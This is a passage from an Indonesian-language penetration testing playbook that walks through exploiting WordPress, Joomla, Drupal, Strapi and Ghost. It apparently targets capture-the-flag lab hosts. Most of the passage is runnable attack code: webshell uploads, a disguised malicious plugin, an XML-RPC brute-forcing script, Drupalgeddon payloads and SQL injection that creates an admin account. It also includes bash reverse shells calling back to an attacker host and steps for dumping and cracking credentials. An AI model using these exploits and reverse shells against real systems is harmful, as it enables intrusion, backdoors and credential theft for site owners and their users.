    --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" \
    -o ~/cms_loot/scans/wpscan_ua.txt 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Users ditemukan:**

text

```
[+] Enumerating Users (via Passive and Aggressive Methods)
[i] User(s) Identified:
[+] admin
 | Found By: Author Posts - Author Pattern (Passive Detection)
[+] editor_jim
 | Found By: Rss Generator (Passive Detection)
```

➡️ Simpan users:

Bash

```
echo "admin
editor_jim" > ~/cms_loot/creds/wp_users.txt
echo "[*] WordPress users saved: $(cat ~/cms_loot/creds/wp_users.txt | wc -l) users"
```

**OUTPUT BERHASIL ✅ — Plugin rentan ditemukan:**

text

```
[!] Title: Contact Form 7 <= 5.3.1 - Unrestricted File Upload (CVE-2020-35489)
 | Reference: https://wpscan.com/vulnerability/10508
[!] Title: WP File Manager 6.0-6.8 - Unauthenticated RCE (CVE-2020-25213)
 | Reference: https://wpscan.com/vulnerability/10389
```

➡️ **PRIORITAS!** Cek pre-auth exploit dulu:

Bash

```
# Catat plugin dan CVE
echo "CVE-2020-25213: WP File Manager RCE - PRE-AUTH" >> ~/cms_loot/scans/vulns.txt
echo "CVE-2020-35489: Contact Form 7 File Upload" >> ~/cms_loot/scans/vulns.txt

# Download exploit
searchsploit -m 49178.py ./  # WP File Manager RCE
```

➡️ **Langsung ke Langkah 2A.5 — Eksploitasi Plugin.**

**OUTPUT GAGAL ❌ — WPScan rate limited:**

text

```
[!] You have reached your daily limit of 25 calls for the API
```

➡️ Lanjut tanpa API token tapi tetap enum manual:

Bash

```
wpscan --url $TARGET_URL --enumerate u,ap --no-update
```

**OUTPUT GAGAL ❌ — Target blokir semua scanning:**

text

```
[!] The target is responding with a 403 for all requests
```

➡️ Coba bypass:

Bash

```
# Bypass 1: Tambah header X-Forwarded-For
wpscan --url $TARGET_URL --enumerate u \
    --http-auth "user:pass" \
    --headers "X-Forwarded-For: 127.0.0.1"

# Bypass 2: Manual via curl dengan header berbeda
curl -s -H "X-Forwarded-For: 127.0.0.1" \
    -H "X-Real-IP: 127.0.0.1" \
    $TARGET_URL/wp-admin/
```

---

### Langkah 2A.3 — User Enumeration (3 Method)

Bash

```
# Method 1: REST API (paling cepat, default aktif di WP modern)
curl -s $TARGET_URL/wp-json/wp/v2/users | jq -r '.[] | "ID:\(.id) User:\(.slug) Name:\(.name)"'

# Method 2: Author query redirect
for i in {1..10}; do
    REDIRECT=$(curl -s -I "$TARGET_URL/?author=$i" | grep -i "Location:" | awk '{print $2}')
    if [[ -n "$REDIRECT" && "$REDIRECT" != *"?author="* ]]; then
        USERNAME=$(echo "$REDIRECT" | grep -o 'author/[^/]*' | cut -d'/' -f2)
        echo "[+] User ID $i: $USERNAME"
        echo "$USERNAME" >> ~/cms_loot/creds/wp_users.txt
    fi
done

# Method 3: XML-RPC user check
curl -s -X POST $TARGET_URL/xmlrpc.php \
    -d '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' \
    | grep -o '<string>[^<]*</string>' | head -20
```

**OUTPUT BERHASIL ✅ — REST API mengekspos users:**

JSON

```
ID:1 User:admin Name:Administrator
ID:2 User:editor_jim Name:Jim Editor
```

**OUTPUT GAGAL ❌ — REST API diblokir:**

JSON

```
{"code":"rest_no_route","message":"No route was found matching the URL and request method."}
```

➡️ REST API dimatikan. Andalkan Method 2 (author redirect):

Bash

```
# Pastikan tidak ada redirect loop
curl -s -I "$TARGET_URL/?author=1" -L | grep "Location:"
```

---

### Langkah 2A.4 — Plugin Enumeration Manual

Bash

```
# Method 1: Passive - dari source HTML
echo "[*] Extracting plugins from HTML source..."
curl -s $TARGET_URL | grep -o 'wp-content/plugins/[^/]*' | cut -d'/' -f3 | sort -u \
    | while read plugin; do
        echo "[+] Plugin found: $plugin"
        # Cek versi dari readme.txt
        VER=$(curl -s "$TARGET_URL/wp-content/plugins/$plugin/readme.txt" 2>/dev/null \
            | grep -i "Stable tag:" | awk '{print $NF}')
        [ -n "$VER" ] && echo "    Version: $VER"
        # Langsung search exploit
        RESULT=$(searchsploit "$plugin" 2>/dev/null | grep -i "wordpress\|wp" | head -3)
        [ -n "$RESULT" ] && echo "    [!] EXPLOIT FOUND: $RESULT"
    done

# Method 2: Active - fuzzing dengan wordlist SecLists
ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt \
    -u $TARGET_URL/wp-content/plugins/FUZZ \
    -mc 200,403,301 \
    -t 40 \
    -o ~/cms_loot/scans/wp_plugins_ffuf.json \
    -of json 2>/dev/null

# Method 3: Cek directory listing
curl -s $TARGET_URL/wp-content/plugins/ | grep -i "Index of"
```

**OUTPUT BERHASIL ✅ — Directory listing aktif:**

HTML

```
Index of /wp-content/plugins/
[DIR] contact-form-7/
[DIR] wp-file-manager/
[DIR] akismet/
```

➡️ **JACKPOT!** List semua plugin dan cek versinya:

Bash

```
curl -s $TARGET_URL/wp-content/plugins/ \
    | grep -o '"[^"]*/"' | tr -d '"/' \
    | while read plugin; do
        echo "=== $plugin ==="
        curl -s "$TARGET_URL/wp-content/plugins/$plugin/readme.txt" | grep -i "Stable tag:"
        searchsploit "wordpress $plugin" 2>/dev/null | head -3
    done
```

---

### Langkah 2A.5 — WordPress CVE Exploitation

> **Masuk sini jika:** WPScan atau enum manual menemukan plugin/core yang vulnerable.

#### PATH A1 — CVE-2020-25213: WP File Manager Pre-Auth RCE

Bash

```
# Verifikasi plugin ada
curl -s -o /dev/null -w "%{http_code}" \
    "$TARGET_URL/wp-content/plugins/wp-file-manager/readme.txt"
```

**OUTPUT BERHASIL ✅ — HTTP 200:**

text

```
200
```

Bash

```
# Eksploitasi: upload shell langsung tanpa auth
# Step 1: Buat shell
echo '<?php system($_GET["cmd"]); ?>' > /tmp/shell.php

# Step 2: Upload via connector
curl -s -F "cmd=upload" \
    -F "target=l1_Lw" \
    -F "upload[]=@/tmp/shell.php;type=image/png" \
    "$TARGET_URL/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"
```

**OUTPUT BERHASIL ✅ — Upload berhasil:**

JSON

```
{"added":[{"isowner":false,"ts":1634567890,"mime":"image/png","read":1,"write":1,
"size":"28","hash":"l1_c2hlbGwucGhw","name":"shell.php","url":"..."}]}
```

Bash

```
# Akses shell
curl "$TARGET_URL/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=id"
```

**OUTPUT BERHASIL ✅ — RCE:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ **SHELL! Upgrade ke reverse shell:**

Bash

```
# Setup listener
nc -lvnp $LPORT &

# Trigger reverse shell
REVSHELL=$(python3 -c "import urllib.parse; print(urllib.parse.quote('bash -c \"bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1\"'))")
curl -s "$TARGET_URL/wp-content/plugins/wp-file-manager/lib/files/shell.php?cmd=$REVSHELL"
```

**OUTPUT GAGAL ❌ — Upload ditolak:**

JSON

```
{"error":["errUploadFile","shell.php"]}
```

➡️ Filter ekstensi aktif. Coba bypass:

Bash

```
# Bypass 1: Double extension
cp /tmp/shell.php /tmp/shell.php.png
curl -s -F "upload[]=@/tmp/shell.php.png;filename=shell.php" \
    -F "cmd=upload" -F "target=l1_Lw" \
    "$TARGET_URL/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"

# Bypass 2: Null byte (untuk versi sangat lama)
# Bypass 3: Lanjut ke CVE lain atau brute force login
```

#### PATH A2 — WordPress Admin Login → RCE

Bash

```
# Langkah 1: Cek apakah XML-RPC aktif (untuk brute force cepat)
XMLRPC_STATUS=$(curl -s $TARGET_URL/xmlrpc.php)
echo "XML-RPC: $XMLRPC_STATUS"
```

**OUTPUT BERHASIL ✅ — XML-RPC aktif:**

text

```
XML-RPC server accepts POST requests only.
```

Bash

```
# Brute force via XML-RPC multicall (JAUH lebih cepat dari form login)
# Multicall: banyak password dalam 1 request, bypass rate limiting
cat > /tmp/wp_brute.py << 'PYEOF'
#!/usr/bin/env python3
import requests, sys, itertools

target = sys.argv[1]
userfile = sys.argv[2]
passfile = sys.argv[3]

users = open(userfile).read().splitlines()
passwords = open(passfile).read().splitlines()

url = f"{target}/xmlrpc.php"
headers = {"Content-Type": "text/xml"}

# Kirim 100 password per request (multicall trick)
BATCH = 100

for user in users:
    print(f"[*] Testing user: {user}")
    for i in range(0, len(passwords), BATCH):
        batch = passwords[i:i+BATCH]
        calls = ""
        for pwd in batch:
            calls += f"""<value><struct>
<member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
<member><name>params</name><value><array><data>
<value><string>{user}</string></value>
<value><string>{pwd}</string></value>
</data></array></value></member>
</struct></value>"""
        
        payload = f"""<?xml version="1.0"?>
<methodCall><methodName>system.multicall</methodName>
<params><param><value><array><data>{calls}</data></array></value></param></params>
</methodCall>"""
        
        r = requests.post(url, data=payload, headers=headers, timeout=10)
        
        for idx, pwd in enumerate(batch):
            # Success response tidak mengandung "faultCode"
            lines = r.text.split('<value>')
            if idx < len(lines) and 'faultCode' not in lines[min(idx+1, len(lines)-1)]:
                if 'isAdmin' in r.text or 'blogName' in r.text:
                    print(f"[+] VALID: {user}:{pwd}")
                    with open("wp_creds.txt", "a") as f:
                        f.write(f"{user}:{pwd}\n")
PYEOF

python3 /tmp/wp_brute.py $TARGET_URL ~/cms_loot/creds/wp_users.txt \
    /usr/share/wordlists/rockyou.txt
```

**OUTPUT BERHASIL ✅ — Password ditemukan:**

text

```
[+] VALID: admin:admin123
```

Bash

```
# Simpan credentials
export WP_USER="admin"
export WP_PASS="admin123"
echo "$WP_USER:$WP_PASS" >> ~/cms_loot/creds/found_creds.txt
```

➡️ **Langsung ke RCE via admin panel:**

Bash

```
# Cara 1: WPScan auto exploit setelah dapat creds
wpscan --url $TARGET_URL -U $WP_USER -P $WP_PASS --enumerate ap

# Cara 2: Manual theme editor (PALING RELIABLE)
# Login ke /wp-admin/ → Appearance → Theme File Editor → 404.php
# Tambahkan: <?php system($_GET['cmd']); ?>
# Simpan → akses: /wp-content/themes/THEME_NAME/404.php?cmd=id

# Detect active theme name
curl -s $TARGET_URL | grep -o 'wp-content/themes/[^/]*' | cut -d'/' -f3 | head -1
```

**Setelah dapat nama theme (misal: twentytwentyone):**

Bash

```
# Upload malicious plugin jika theme editor disabled
mkdir -p /tmp/evil_plugin
cat > /tmp/evil_plugin/evil.php << 'PHPEOF'
<?php
/**
 * Plugin Name: System Health Monitor
 * Version: 2.0
 */
if (isset($_GET['cmd'])) { system($_GET['cmd']); exit; }
PHPEOF

cd /tmp/evil_plugin
zip -r /tmp/evil_plugin.zip evil.php

# Upload via curl dengan cookie session admin
# Langkah: Login dulu dapat cookie, lalu upload
COOKIE=$(curl -s -c /tmp/wp_cookies.txt -b /tmp/wp_cookies.txt \
    -d "log=$WP_USER&pwd=$WP_PASS&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1" \
    -H "Cookie: wordpress_test_cookie=WP Cookie check" \
    -o /dev/null -w "%{http_code}" \
    "$TARGET_URL/wp-login.php")

echo "Login response: $COOKIE"

# Setelah login, cek akses admin
curl -s -b /tmp/wp_cookies.txt $TARGET_URL/wp-admin/ | grep -i "Dashboard\|wp-admin"
```

**OUTPUT BERHASIL ✅ — Login berhasil:**

text

```
Dashboard
```

Bash

```
# Trigger reverse shell via webshell
nc -lvnp $LPORT &

SHELL_URL="$TARGET_URL/wp-content/plugins/evil/evil.php"
# Atau jika via theme editor:
SHELL_URL="$TARGET_URL/wp-content/themes/twentytwentyone/404.php"

# Test dulu
curl "$SHELL_URL?cmd=id"

# Trigger reverse shell
curl "$SHELL_URL?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

**OUTPUT BERHASIL ✅ — Reverse shell:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## ═══════════════════════════════════════

## FASE 2B: JOOMLA — ENUMERATION LENGKAP

## ═══════════════════════════════════════

### Langkah 2B.1 — Ekstrak Versi Joomla

Bash

```
# Method 1: XML Manifest (paling akurat untuk Joomla 3.x)
curl -s "$TARGET_URL/administrator/manifests/files/joomla.xml" | grep -i "<version>"

# Method 2: Language file
curl -s "$TARGET_URL/language/en-GB/en-GB.xml" | grep -i "<version>"

# Method 3: robots.txt bawaan Joomla
curl -s "$TARGET_URL/robots.txt" | grep -i "Joomla"

# Method 4: README.txt
curl -s "$TARGET_URL/README.txt" | head -5
```

**OUTPUT BERHASIL ✅:**

XML

```
<version>3.9.12</version>
```

Bash

```
export JOOMLA_VERSION="3.9.12"
echo "[*] Joomla Version: $JOOMLA_VERSION"
searchsploit joomla $JOOMLA_VERSION
searchsploit joomla 3.9 | grep -i "RCE\|Remote Code"
```

---

### Langkah 2B.2 — JoomScan Full Scan

Bash

```
# Scan komprehensif
joomscan -u $TARGET_URL --ec 2>/dev/null | tee ~/cms_loot/scans/joomscan.txt

# Jika timeout/WAF blocking
joomscan -u $TARGET_URL --delay 2 \
    --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" 2>/dev/null
```

**OUTPUT BERHASIL ✅ — Versi + CVE terdeteksi:**

text

```
[+] Detecting Joomla Version: 3.9.12
[+] Core Vulnerabilities: 
 | Joomla 3.0.0 - 3.4.6 Remote Code Execution
[+] Admin Page: http://10.10.11.200/administrator/
[+] Directory Listing Enabled: http://10.10.11.200/administrator/components/
```

---

### Langkah 2B.3 — Joomla CVE Check (Prioritas Tertinggi)

Bash

```
# SELALU cek ini untuk Joomla 4.x dulu — pre-auth info leak
JOOMLA_API=$(curl -s "$TARGET_URL/api/index.php/v1/config/application?public=true")
echo $JOOMLA_API | jq . 2>/dev/null || echo "$JOOMLA_API"
```

**OUTPUT BERHASIL ✅ — CVE-2023-23752 VULNERABLE:**

JSON

```
{
  "data": {
    "type": "application",
    "attributes": {
      "user": "root",
      "password": "SuperSecretDatabasePassword2023!",
      "db": "joomla_db",
      "dbtype": "mysqli"
    }
  }
}
```

➡️ **JACKPOT! Database credentials leaked:**

Bash

```
# Simpan credentials
export DB_USER="root"
export DB_PASS="SuperSecretDatabasePassword2023!"
export DB_NAME="joomla_db"
echo "DB: $DB_USER:$DB_PASS@$DB_NAME" >> ~/cms_loot/creds/found_creds.txt

# Coba password ini di panel admin Joomla
# Banyak admin pakai password DB yang sama untuk login Joomla!
# → Ke Langkah 2B.5 (Login ke admin panel)

# Coba juga ke MySQL langsung
mysql -h $TARGET -u $DB_USER -p$DB_PASS $DB_NAME -e "SELECT username,password FROM '#__users';" 2>/dev/null

# Coba ke SSH dengan password ini
nxc ssh $TARGET -u admin -p "$DB_PASS"
```

**OUTPUT GAGAL ❌ — Not vulnerable (API return 404 atau empty):**

text

```
404 Not Found
{}
```

➡️ Bukan Joomla 4.0-4.2.8 atau sudah patch. Lanjut ke SQL Injection check:

Bash

```
# Cek CVE-2017-8917 SQLi (Joomla 3.7.0)
if [[ "$JOOMLA_VERSION" == "3.7.0" ]]; then
    echo "[!] CVE-2017-8917 SQL Injection kemungkinan ada!"
    sqlmap -u "$TARGET_URL/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" \
        --risk=3 --level=5 --dbs --batch \
        -o ~/cms_loot/scans/joomla_sqli.txt 2>/dev/null
fi

# Cek user enumeration via component
curl -s "$TARGET_URL/index.php?option=com_contact&view=category&id=1" \
    | grep -Ei "email|href.*contact"
```

---

### Langkah 2B.4 — Joomla Brute Force Admin

Bash

```
# Method 1: Hydra pada form login Joomla
hydra -L ~/cms_loot/creds/joomla_users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    $TARGET http-post-form \
    "/administrator/index.php:username=^USER^&passwd=^PASS^&option=com_login&task=login:F=Invalid credentials" \
    -t 10 -f 2>/dev/null

# Method 2: coba default creds manual
for CRED in "admin:admin" "admin:password" "admin:admin123" "administrator:administrator"; do
    USER=$(echo $CRED | cut -d: -f1)
    PASS=$(echo $CRED | cut -d: -f2)
    RESULT=$(curl -s -c /tmp/joomla_cookie.txt \
        -d "username=$USER&passwd=$PASS&option=com_login&task=login&return=aW5kZXgucGhw" \
        "$TARGET_URL/administrator/index.php" | grep -i "Dashboard\|Control Panel")
    [ -n "$RESULT" ] && echo "[+] VALID: $USER:$PASS"
done
```

**OUTPUT BERHASIL ✅ — Login berhasil:**

text

```
[+] VALID: admin:admin123
```

---

### Langkah 2B.5 — Joomla Admin → RCE

Bash

```
# Konfirmasi admin access
ADMIN_ACCESS=$(curl -s -b /tmp/joomla_cookie.txt "$TARGET_URL/administrator/index.php" \
    | grep -i "Control Panel\|Dashboard")
echo "Admin access: ${ADMIN_ACCESS:0:50}"
```

**OUTPUT BERHASIL ✅ — Access confirmed:**

Bash

```
# Path ke RCE: Edit template file
# Extensions → Templates → Templates → Protostar/Beez → error.php

# Inject webshell via template API (jika curl-able)
# Atau manual via browser:
# 1. Extensions → Templates → Templates
# 2. Klik template aktif (contoh: Protostar)
# 3. Klik "error.php" atau "index.php"
# 4. Tambahkan: <?php if(isset($_REQUEST['cmd'])){ system($_REQUEST['cmd']); } ?>
# 5. Save

# Setelah inject, akses
TEMPLATE_NAME="protostar"  # atau "beez3"
curl "$TARGET_URL/templates/$TEMPLATE_NAME/error.php?cmd=id"
```

**OUTPUT BERHASIL ✅:**

text

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Bash

```
# Upgrade ke reverse shell
nc -lvnp $LPORT &
curl "$TARGET_URL/templates/$TEMPLATE_NAME/error.php?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261'"
```

---

## ═══════════════════════════════════════

## FASE 2C: DRUPAL — ENUMERATION LENGKAP

## ═══════════════════════════════════════

### Langkah 2C.1 — Ekstrak Versi Drupal

Bash

```
# Method 1: CHANGELOG.txt (Drupal 7 dan awal Drupal 8)
curl -s $TARGET_URL/CHANGELOG.txt | head -5

# Method 2: Core CHANGELOG (Drupal 8+)
curl -s $TARGET_URL/core/CHANGELOG.txt | head -5

# Method 3: Dari header HTTP
curl -s -I $TARGET_URL | grep -i "X-Generator\|X-Drupal"

# Method 4: Droopescan
droopescan scan drupal -u $TARGET_URL -t 32 2>/dev/null \
    | tee ~/cms_loot/scans/droopescan.txt
```

**OUTPUT BERHASIL ✅ — CHANGELOG.txt terbuka:**

text

```
Drupal 7.54, 2017-02-01
```

Bash

```
export DRUPAL_VERSION="7.54"
echo "[*] Drupal Version: $DRUPAL_VERSION"

# LANGSUNG cek Drupalgeddon series!
searchsploit drupal 7.54
searchsploit drupal | grep -i "Drupalgeddon\|Remote Code"
```

---

### Langkah 2C.2 — Drupalgeddon Check (PRIORITAS PERTAMA!)

Bash

```
# ===== DRUPALGEDDON 2 — CVE-2018-7600 =====
# Target: Drupal < 7.58 / 8.x < 8.5.1

# Test apakah vulnerable (command: id)
echo "[*] Testing Drupalgeddon2 (CVE-2018-7600)..."

# Untuk Drupal 8.x
DG2_RESULT=$(curl -s -k -X POST \
    "$TARGET_URL/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
    --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=id")

echo "$DG2_RESULT"
```

**OUTPUT BERHASIL ✅ — RCE via Drupalgeddon2:**

JSON

```
[{"command":"insert",...}]uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

➡️ **JACKPOT! Pre-auth RCE!**

Bash

```
echo "[!] DRUPALGEDDON2 CONFIRMED! Getting reverse shell..."

# Setup listener
nc -lvnp $LPORT &

# Trigger reverse shell
REVSHELL_CMD="bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"
curl -s -k -X POST \
    "$TARGET_URL/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax" \
    --data "form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=$REVSHELL_CMD"
```

**OUTPUT GAGAL ❌ — user/register form disabled:**

JSON

```
[{"command":"insert","data":""}]
```

➡️ Coba via password reset form (alternatif Drupal 7.x):

Bash

```
# Drupal 7.x: password reset form injection
curl -s -k -X POST \
    "$TARGET_URL/?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]=id" \
    --data "form_id=user_pass&_triggering_element_name=name"
```

**OUTPUT GAGAL ❌ — Tidak ada output command:**

➡️ Mungkin versi sudah patch. Coba Drupalgeddon3:

Bash

```
# ===== DRUPALGEDDON 3 — CVE-2019-6340 =====
# Target: Drupal 8.x < 8.6.10 dengan REST module aktif

# Cek apakah REST module aktif
curl -s "$TARGET_URL/node/1?_format=hal_json" | jq . 2>/dev/null | head -10
```

**OUTPUT BERHASIL ✅ — REST API response:**

JSON

```
{"nid":[{"value":1}],"uuid":[{"value":"..."}]}
```

Bash

```
# Eksploitasi via Metasploit (lebih reliable untuk Drupalgeddon3)
msfconsole -q -x "
use exploit/unix/webapp/drupal_restws_unserialize;
set RHOSTS $TARGET;
set TARGETURI /;
set LHOST $LHOST;
set LPORT $LPORT;
set PAYLOAD php/meterpreter/reverse_tcp;
exploit"
```

**OUTPUT GAGAL ❌ — Semua Drupalgeddon gagal:**

➡️ Target mungkin sudah patch atau versi lain. Coba Drupalgeddon1 (SQLi):

Bash

```
# ===== DRUPALGEDDON 1 — CVE-2014-3704 =====
# Target: Drupal 7.x < 7.32

if [[ "$DRUPAL_VERSION" < "7.32" ]]; then
    echo "[!] CVE-2014-3704 SQL Injection - Creating admin user..."
    python3 - << 'PYEOF'
import requests

target = "http://10.10.11.200"
url = f"{target}/?q=node&destination=node"

# SQL injection via login form array parameter
data = {
    "name[0 OR 1=1;INSERT INTO users (uid,name,pass,status,roles) SELECT MAX(uid)+1,'hacker','$S$DkIkdKLIvRK0iVHm99X7B5El1AI.wT5J.NT.sFBQCFNPAqQgADvH',1,2 FROM users;#]": "hacker",
    "name[0]": "hacker", 
    "pass": "anything",
    "form_id": "user_login_block"
}

r = requests.post(url, data=data, allow_redirects=False)
print(f"[*] Status: {r.status_code}")
print("[+] SQL injection sent. Try login: hacker/hacker")
PYEOF
fi

# Coba Metasploit Drupalgeddon2 (sering lebih reliable)
msfconsole -q -x "
use exploit/unix/webapp/drupal_drupalgeddon2;
set RHOSTS $TARGET;
set TARGETURI /;
set LHOST $LHOST;
set LPORT $LPORT;
check;
exploit"
```

---

### Langkah 2C.3 — Drupal Admin → RCE (Jika Dapat Login)

Bash

```
# Brute force login admin Drupal
hydra -L ~/cms_loot/creds/drupal_users.txt \
    -P /usr/share/wordlists/rockyou.txt \
    $TARGET http-post-form \
    "/user/login:name=^USER^&pass=^PASS^&form_id=user_login_form:F=Sorry" \
    -t 10 -f 2>/dev/null

# Default creds
for CRED in "admin:admin" "admin:password" "root:root"; do
    USER=$(echo $CRED | cut -d: -f1)
    PASS=$(echo $CRED | cut -d: -f2)
    CODE=$(curl -s -o /dev/null -w "%{http_code}" \
        -d "name=$USER&pass=$PASS&form_id=user_login_form&op=Log+in" \
        "$TARGET_URL/user/login")
    [[ "$CODE" == "302" ]] && echo "[+] VALID: $USER:$PASS"
done
```

**OUTPUT BERHASIL ✅ — Login berhasil (redirect 302):**

Bash

```
# Drupal 7: Enable PHP Filter module → RCE
# Modules → PHP Filter → Enable
# Add Content → Basic Page → Text format: PHP code
# Body: <?php system($_GET['c']); ?>

# Setelah save, akses node
curl "$TARGET_URL/?q=node/1&c=id"
```

---

## ═══════════════════════════════════════

## FASE 2D: OTHER CMS

## ═══════════════════════════════════════

### Langkah 2D.1 — Strapi (Port 1337)

Bash

```
# Konfirmasi Strapi
curl -s http://$TARGET:1337/admin/init | jq .
```

**OUTPUT BERHASIL ✅:**

JSON

```
{"data":{"hasAdmin":true}}
```

Bash

```
# Cek versi
curl -s http://$TARGET:1337/admin/init | jq '.data'

# CVE-2019-18818: Password Reset Bypass (Strapi < 3.0.0-beta.17.5)
curl -X POST "http://$TARGET:1337/admin/auth/reset-password" \
    -H "Content-Type: application/json" \
    -d '{
        "code": {"$ne": null},
        "password": "NewPassword123!",
        "passwordConfirmation": "NewPassword123!"
    }'
```

**OUTPUT BERHASIL ✅ — Password reset berhasil:**

JSON

```
{"jwt":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","user":{"id":1,"username":"admin"}}
```

Bash

```
# Simpan JWT token
export STRAPI_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."

# CVE-2019-19609: Authenticated RCE setelah dapat JWT
msfconsole -q -x "
use exploit/linux/http/strapi_admin_install_rce;
set RHOSTS $TARGET;
set RPORT 1337;
set USERNAME admin@example.com;
set PASSWORD NewPassword123!;
set LHOST $LHOST;
set LPORT $LPORT;
exploit"
```

### Langkah 2D.2 — Ghost CMS (Port 2368)

Bash

```
# Konfirmasi Ghost
curl -s http://$TARGET:2368/ghost/ | grep -i "Ghost"

# Login default
curl -s -c /tmp/ghost_cookie.txt \
    -d '{"username":"ghost@example.com","password":"Password1234"}' \
    -H "Content-Type: application/json" \
    "http://$TARGET:2368/ghost/api/v3/admin/session/"
```

---

## ═══════════════════════════════════════

## FASE 3: POST-EXPLOITATION — SETELAH DAPAT WEB SHELL

## ═══════════════════════════════════════

### Langkah 3.1 — Stabilisasi Shell

Bash

```
# Di dalam web shell atau reverse shell yang didapat:

# Upgrade dari dumb shell ke PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# CTRL+Z
stty raw -echo; fg
export TERM=xterm
stty rows 40 cols 200

# Atau gunakan socat untuk TTY lebih baik
# Di attacker:
socat file:`tty`,raw,echo=0 tcp-listen:$LPORT
# Di target (via webshell):
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:$LPORT
```

---

### Langkah 3.2 — Info Gathering Post Shell

Bash

```
# JALANKAN SEMUA INI segera setelah dapat shell

# 1. Identitas dan privilege
id && whoami && groups

# 2. Cari config files CMS (sering berisi DB credentials)
# WordPress
cat /var/www/html/wp-config.php 2>/dev/null | grep -E "DB_|table_prefix"

# Joomla
cat /var/www/html/configuration.php 2>/dev/null | grep -E "password|user|host|db"

# Drupal
cat /var/www/html/sites/default/settings.php 2>/dev/null | grep -A5 "database"

# 3. Credentials dari config
# Simpan semua DB creds yang ditemukan
```

**OUTPUT BERHASIL ✅ — WordPress DB creds:**

PHP

```
define('DB_HOST', 'localhost');
define('DB_NAME', 'wordpress');
define('DB_USER', 'wp_user');
define('DB_PASSWORD', 'DBpassword2024!');
```

Bash

```
# Simpan dan test creds ini
export DB_USER="wp_user"
export DB_PASS="DBpassword2024!"
echo "$DB_USER:$DB_PASS" >> ~/cms_loot/creds/found_creds.txt

# Dump WordPress users dari database (termasuk hash password admin)
mysql -u $DB_USER -p$DB_PASS wordpress -e \
    "SELECT user_login, user_pass FROM wp_users;" 2>/dev/null

# Crack hash WordPress ($P$ format = phppass)
# Catat hash
echo '$P$BVbptMaOLUVMFHPQKLxMHEEWiRN7jE/' > /tmp/wp_hash.txt
hashcat -m 400 /tmp/wp_hash.txt /usr/share/wordlists/rockyou.txt --force
```

---

### Langkah 3.3 — Pivot ke Service Lain

Bash

```
# Setiap kali dapat credentials dari CMS, test ke service lain
# (Sama seperti di SMB workflow)

# Test DB password ke SSH
nxc ssh $TARGET -u $DB_USER -p $DB_PASS

# Test ke MySQL langsung (kadang bisa RCE via MySQL)
# → ke <a href="/docs/mysql" class="text-[#00b4d8] hover:underline font-mono font-semibold">14a_mysql_workflow.md</a>

# Cek internal network dari web shell
ss -tunp
cat /etc/hosts
arp -n

# Cari credential reuse di file lain
find /var/www /home /root -name "*.conf" -o -name "*.php" -o -name ".env" 2>/dev/null \
    | xargs grep -lE "password|passwd|secret" 2>/dev/null

# Pivot ke PrivEsc
# → ke <a href="/docs/linux-privesc" class="text-[#00b4d8] hover:underline font-mono font-semibold">44_linux_privesc_workflow.md</a>
```

---

## ═══════════════════════════════════════

## TROUBLESHOOTING — SEMUA ERROR & SOLUSINYA

## ═══════════════════════════════════════

|Error|Penyebab|Solusi|
|---|---|---|
|WPScan: `302 redirect` pada semua path|Redirect ke HTTPS|Ubah URL ke `https://`|
|WPScan: API limit 25/day|Token gratis habis|`--no-update` tanpa token, atau pakai docker|
|Tools diblokir WAF|Signature scanner terdeteksi|Tambah `--user-agent "Mozilla/5.0..."` atau `--random-agent`|
|`wp-admin` return 403|IP whitelist di `.htaccess`|`curl -H "X-Forwarded-For: 127.0.0.1"` atau `X-Real-IP`|
|`xmlrpc.php` return 403|Diblokir admin|Beralih ke form login `/wp-login.php` + Hydra|
|Drupalgeddon2 return empty|Form registrasi disabled|Coba via password reset form atau Metasploit module|
|JoomScan timeout|Firewall rate limiting IP|`joomscan --delay 2` atau `-t 5`|
|CMSeeK false negative|HTTPS redirect / VHost issue|Tambahkan domain ke `/etc/hosts`, gunakan `http://domain.htb`|
|Versi CMS tidak terdeteksi|Admin hapus readme/meta/API|Hash comparison file JS: `curl -s $TARGET_URL/wp-includes/js/jquery/jquery.js \| md5sum`|
|Plugin dir listing tertutup (403)|`Options Indexes` dimatikan|`ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/wp-plugins.fuzz.txt`|
|Shell upload ditolak|MIME/extension filter|Double ext: `shell.php.png`, null byte, atau coba plugin upload|
|Joomla API return 404|Bukan Joomla 4.0-4.2.8|Beralih ke JoomScan + brute force login|
|Reverse shell tidak connect|Firewall outbound|Coba port 80, 443, 53; gunakan `curl` untuk test outbound|
|`php system()` disabled|`disable_functions` di php.ini|Coba `passthru()`, `exec()`, `shell_exec()`, `proc_open()`|

### Jika Semua Plugin RCE Gagal — Manual Check disable_functions:

Bash

```
